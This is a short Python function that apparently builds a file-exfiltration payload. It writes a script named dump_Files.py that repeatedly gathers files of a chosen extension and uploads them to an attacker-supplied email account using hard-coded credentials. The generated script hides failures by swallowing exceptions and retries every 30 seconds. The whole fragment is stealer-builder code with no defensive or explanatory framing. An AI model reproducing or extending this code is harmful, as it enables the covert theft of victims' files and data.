def build_Fs(email, Password , extension):
	with open("dump_Files.py","w+") as file:
		file.write("from Uptomage import FilesSend\n")
		file.write("from time import sleep\n")
		file.write("""
def run():
	if __name__ == "__main__":
		while 1:
			try:
	""")
		file.write(""" 
				filessend = FilesSend()
				""")
		file.write("filessend.Extension("+"'"+extension + "'"+")"+"\n")
		file.write("				"+"filessend.uploading("+"'"+email + "'" +"," + "'" + Password +"'" +")" + "\n")
		file.write("""
			except Exception:
				pass
				sleep(30)
	""")
		file.write(""" 
run()
	""")
		file.close()
